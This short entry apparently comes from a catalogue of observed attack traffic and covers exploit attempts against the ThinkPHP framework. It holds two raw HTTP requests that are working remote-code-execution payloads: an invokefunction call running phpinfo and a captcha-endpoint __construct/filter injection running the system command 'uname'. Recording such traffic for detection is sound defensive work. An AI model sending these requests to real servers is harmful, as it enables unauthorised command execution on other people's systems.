# ThinkPHP Exploit Attempts

# Link
https://www.exploit-db.com/exploits/46150

# Protocols:
HTTP

# Ports:
80

# Sample:

```
GET /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1
Host: 209.97.144.74
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)
Connection: close
Accept-Encoding: gzip


POST /index.php?s=captcha HTTP/1.1
Host: 209.97.144.74
User-Agent: Go-http-client/1.1
Content-Length: 84
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=uname&ipconfig
```
